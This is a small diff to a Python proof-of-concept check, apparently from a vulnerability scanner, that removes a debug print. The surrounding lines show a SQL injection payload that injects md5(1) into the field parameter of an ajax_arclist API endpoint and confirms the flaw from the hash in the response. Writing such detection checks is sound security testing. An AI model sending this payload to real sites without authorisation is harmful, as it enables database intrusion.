@@ -35,7 +35,6 @@ class Poc(ABPoc):
 
             payload = '''s=/api/ajax_arclist/model/article/field/md5(1)%23'''
             verify_url = ('%s/index.php?%s') % (self.target, payload)
-            print(verify_url)
             req = requests.get(verify_url)
             if req.status_code == 200 and 'ca4238a0b923820dcc509a6f75849' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
